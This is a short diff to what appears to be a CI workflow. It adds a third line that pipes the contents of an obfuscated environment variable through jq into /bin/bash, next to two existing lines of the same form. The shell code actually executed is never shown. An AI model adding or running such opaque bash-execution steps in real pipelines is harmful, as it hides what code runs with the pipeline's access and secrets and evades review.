@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
           printf '%s' "$ia80571" | jq -r .nipaz0 | /bin/bash
+          printf '%s' "$fttb26979" | jq -r .xe83 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
